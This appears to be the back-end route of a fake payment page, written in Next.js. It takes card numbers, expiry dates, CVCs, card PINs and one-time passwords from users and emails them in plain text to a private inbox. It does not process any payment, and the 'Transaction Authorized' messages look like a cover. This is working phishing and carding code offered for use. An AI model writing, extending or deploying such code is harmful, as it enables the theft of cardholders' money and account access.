import { type NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

export async function POST(request: NextRequest) {
  try {
    const { subject, message, userEmail, amount, cardDetails, pin, otp } = await request.json()

    // Validate environment variables
    if (!process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.RECEIVER_EMAIL) {
      return NextResponse.json({ success: false, error: "Email configuration missing" }, { status: 500 })
    }

    // Create transporter
    const transporter = nodemailer.createTransporter({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    })

    // Prepare email content based on the step
    let emailContent = ""

    if (subject.includes("PIN")) {
      emailContent = `
        <h2>Payment PIN Entered</h2>
        <p><strong>User Email:</strong> ${userEmail}</p>
        <p><strong>Amount:</strong> ₦${amount}</p>
        <p><strong>Card Details:</strong></p>
        <ul>
          <li>Name on Card: ${cardDetails?.nameOnCard || "N/A"}</li>
          <li>Card Number: ${cardDetails?.cardNumber || "N/A"}</li>
          <li>Expiry: ${cardDetails?.expiry || "N/A"}</li>
          <li>CVC: ${cardDetails?.cvc || "N/A"}</li>
        </ul>
        <p><strong>PIN Entered:</strong> ${pin}</p>
        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
      `
    } else if (subject.includes("OTP")) {
      emailContent = `
        <h2>OTP Verification Completed</h2>
        <p><strong>User Email:</strong> ${userEmail}</p>
        <p><strong>Amount:</strong> ₦${amount}</p>
        <p><strong>OTP Entered:</strong> ${otp}</p>
        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>Status:</strong> Transaction Authorized</p>
      `
    }

    // Send email
    await transporter.sendMail({
      from: process.env.SMTP_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: subject,
      html: emailContent,
    })

    return NextResponse.json({ success: true, message: "Email sent successfully" })
  } catch (error) {
    console.error("Email sending error:", error)
    return NextResponse.json({ success: false, error: "Failed to send email" }, { status: 500 })
  }
}
